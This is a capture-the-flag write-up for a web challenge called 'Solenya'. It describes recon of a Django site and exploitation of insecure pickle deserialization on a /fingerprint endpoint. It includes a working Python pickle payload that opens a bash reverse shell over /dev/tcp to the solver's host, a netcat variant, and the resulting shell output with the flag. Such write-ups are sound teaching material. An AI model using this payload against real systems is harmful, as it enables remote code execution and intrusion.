# Solenya, web300

Challenge text: "Whatever this thing is, it's shaming us. 172.31.2.105".

So we start off with only an IP address, that does not respond on port 80. We quickly try a few other common ports, and it turns out that a webserver is being hosted on port 8000. We are greeted by an image of 'Pickle Rick':

![Pickle Rick](https://github.com/noproplem/defcon_openctf_2018/blob/master/solenya/images/1.png)

There isn't much going on besides the image, so we check for a /robots.txt file. Turns out that there is a robots.txt file, and it contains LOTS of references to subdirs on the website. These should all be enumerated and hopefully one of them will be interesting. However, before setting up something to do that, lets jsut check a few manually.

By visting a random subdir from the robots.txt file we get a Django debug message - since the Django installation apparently is in debug mode. The message mentions the subdirs: /wubbalubbadubdub and /fingerprint. This seems interesting. Visiting http://172.31.2.105:8000/fingerprint we see an image of Birdman, and on http://172.31.2.105:8000/wubbalubbadubdub there is a login prompt. We try a few common sets of credentials: admin/password and so on, but no luck.

The name of the challenge, "Solenya", and the "pickle Rick" references could very likely be a hint about Pickle (https://docs.python.org/3/library/pickle.html), which is used to serialize python objects. Since the webpage runs Django this seems likely. Exploiting pickle to deserialize an object that gives code executin is a common trick (https://blog.nelhage.com/2011/03/exploiting-pickle/), so we basically just need to find out how to send some data that will be deserialzied by the website, then create and send our payload.

After playing around with the login prompt we see that after a login attempt a huge POST request is mad eto /fingerprint:

```
POST /fingerprint/ HTTP/1.1
Host: 172.31.2.105:8000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://172.31.2.105:8000/wubbalubbadubdub/login/?next=/wubbalubbadubdub/
content-type: application/json; charset=utf-8
token: SSdtIFBpY2tsZSBSaWNrIQ==
origin: http://172.31.2.105:8000
Content-Length: 34686
Cookie: csrftoken=eVxZrS4DcdnACesJcLtxLq8hfFVXnnY1UgTUyx6yb6Ac1yeWRXrerGtX0zjWC1dz
Connection: close

S'{"hash":"58c9ee941b8434d28dd5692628dc2ff9","vectors":[{"key":"user_agent","value":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0"},{"key":"language","value":"en-US"},{"key":"color_depth","value":24},{"key":"device_memory","value":-1},{"key":"hardware_concurrency","value":4},{"key":"resolution","value":[1280,720]},{"key":"available_resolution","value":[1215,696]},{"key":"timezone_offset","value":420},{"key":"session_storage","value":1},{"key":"local_storage","value":1},{"key":"indexed_db","value":1},{"key":"cpu_class","value":"unknown"},{"key":"navigator_platform","value": . . . (continues)
```

The body looks like a serialized object. Lets see how it is made. On http://172.31.2.105:8000/wubbalubbadubdub/ there is a reference to http://172.31.2.105:8000/static/base.min.js which has:
```
(snippet)
new Fingerprint2().get(function(hash, vectors) {
    const data = {
        hash: hash,
        vectors: vectors
    };
    const json_data = JSON.stringify(data);
    const pickle_data = pickle.dumps(json_data);
    const url = `${window.location.origin }/fingerprint/`;
    fetch(url, {
        method: "POST",
        mode: "cors",
        cache: "no-cache",
        credentials: "same-origin",
        headers: {
            "Content-Type": "application/json; charset=utf-8",
            "Token": "SSdtIFBpY2tsZSBSaWNrIQ=="
        },
        redirect: "follow",
        body: pickle_data
    })
});
```

So we can see that indeed the body is just a nonencoded pickle object. Time to create pickle object that gives us a shell:

```python
import cPickle
import subprocess
import base64

class RunBinSh(object):
  def __reduce__(self):
    return (subprocess.Popen, (('/bin/bash','-c', 'bash >/dev/tcp/172.31.127.232/8181 0>&1 2>&1'),))
    #return (subprocess.Popen, (('/bin/nc','172.31.127.232','8181'),))

print cPickle.dumps(RunBinSh())
cPickle.loads(cPickle.dumps(RunBinSh()))
```
We send this using burp proxy while having a nc listener on our own host:

```
nc -lp 8181

ls -lah
total 118M
drwxr-xr-x 5 jaguar jaguar 4.0K Aug  9 06:20 .
drwxr-xr-x 3 root   root   4.0K Aug  9 06:14 ..
drwxr-xr-x 3 jaguar jaguar 4.0K Aug  9 06:20 app
-r--r--r-- 1 jaguar jaguar   79 Aug  9 06:20 .flag
-rwxr-xr-x 1 jaguar jaguar  535 Aug  9 06:12 manage.py
-rw-r--r-- 1 jaguar jaguar  164 Aug  9 06:12 nginx-solenya
-rw-r--r-- 1 jaguar jaguar   24 Aug  9 06:12 requirements.txt
-rwxr-xr-x 1 jaguar jaguar 3.4K Aug  9 06:12 setup.sh
-rw-r--r-- 1 jaguar jaguar  199 Aug  9 06:12 solenya-uwsgi.service
drwxr-xr-x 2 jaguar jaguar 4.0K Aug  9 06:12 static
drwxr-xr-x 2 jaguar jaguar 4.0K Aug  9 06:12 templates
-rw-r--r-- 1 jaguar jaguar  238 Aug  9 06:12 uwsgi.ini
-rw-r----- 1 jaguar jaguar 118M Aug 11 20:30 uwsgi.log
cat .flag
--He crawls from bowls of cold soup to steal the dreams of wasteful children--
```

So there we have it "--He crawls from bowls of cold soup to steal the dreams of wasteful children--".
